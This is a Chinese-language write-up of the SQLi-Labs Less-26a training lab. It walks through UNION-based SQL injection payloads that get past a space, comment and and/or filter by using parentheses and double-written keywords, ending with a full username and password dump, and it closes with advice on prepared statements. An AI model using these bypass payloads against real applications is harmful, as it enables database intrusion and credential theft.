## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：地狱级
- 通关标识：在空格、注释符、`and`、`or` 全被彻底过滤的极端环境下，利用 `union` 嵌套、双写绕过和 `||` 逻辑或，完美闭环语法，爆出所有账号密码。

## 二、大白话原理讲解
这关把“地狱难度”体现得淋漓尽致。柜员（数据库）把你能想到的作案工具全没收了：
1. 没收了**空格**：`union select` 变成 `unionselect`，直接报错。
2. 没收了**注释符**：`#` 和 `--+` 全没了，没法剪掉后面的小尾巴。
3. 没收了**连词**：只要看到 `and` 和 `or`，哪怕在单词里（比如 `information`、`password`），也统统删掉。

既然不能硬拼，咱们就只能“智取”。这套神级 Payload 的核心就是：**用括号代替空格，用双写骗过过滤，用 `||` 拼接闭环。**

## 三、解题步骤与原理拆解

**终极 Payload：**
```text
?id=0')union(select(1),group_concat(username,0x3a,passwoorrd),(3)from(users)where(1=1)||'
```

**🧩 核心原理大解密：**

1. **`id=0`：清空舞台**
   数据库里通常没有 ID 为 0 的用户。写 `0` 能让前面的查询直接落空，把页面回显的位置完全腾出来，留给咱们的 `union` 联合查询。

2. **`')`：拔出后台原本的“门钥匙”**
   这关的闭合方式是单引号加括号。你输入 `0')`，拼接后变成了 `WHERE id = ('0')`。一个单引号加一个右括号，刚好完美闭合了后台的原始语法。

3. **`union(select(...))`：用括号代替空格**
   在 MySQL 里，括号是可以代替空格作为分隔符的。`union(select(1),database())` 是完全合法的，这就完美绕过了空格限制。

4. **`infoorrmation` 和 `passwoorrd`：对抗“无脑文字狱”**
   后台对 `or` 是无脑杀。如果你写 `information_schema`，里面的 `or` 被杀掉，变成 `infmation`。所以咱们写 `infoorrmation`，后台杀掉中间的 `or`，剩下的刚好拼回 `information`。同理，`password` 写成 `passwoorrd`。

5. **终极神来之笔：结尾的 `3||'`**
   后台原本的代码后面跟着 `') LIMIT 0,1`。咱们不能用 `#` 或 `--+` 去注释掉它。你输入的结尾是 `3||'`。拼接到后台代码里，就变成了：**`... ,3||'') LIMIT 0,1`**。
   后台自带了一个 `')`，你输入了 `||'`。两者一碰，单引号和括号完美闭合！`||` 作为一个合法的逻辑运算符，把前后的语句连在一起，语法奇迹般地闭环了！没有用任何注释符，就骗过了数据库。

## 四、最终 Payload 执行

**1. 爆库名（验证回显）：**
```text
?id=0')union(select(1),database(),3||'
```
**回显**：页面第 2 列显示 `security`。

**2. 爆表名（双写 information）：**
```text
?id=0')union(select(1),group_concat(table_name),(3)from(infoorrmation_schema.tables)where(table_schema=database())||'
```
**回显**：`emails, referers, uagents, users`。

**3. 终极脱库（双写 password）：**
```text
?id=0')union(select(1),group_concat(username,0x3a,passwoorrd),(3)from(users)where(1=1)||'
```
**回显**：`Dumb:Dumb,Angelina:I-kill-you...` 等所有账号密码全部爆出，通关！

## 五、总结与防御
**本题总结**：
Less-26a 是一道堪称艺术的 WAF 绕过题。它告诉我们，只要 SQL 语法允许，没有空格、没有注释符、没有 and/or，依然能构造出完整的联合查询。这套“括号替空格 + 双写 + `||` 闭环”的思路，在实战中价值极高。

**安全防御建议**：
- **预编译语句（PDO/MySQLi）**：最根本的防御，让所有花里胡哨的绕过全部失效。
- **白名单机制**：不要用黑名单去猜黑客输入什么，直接限制输入类型（如只允许数字）。
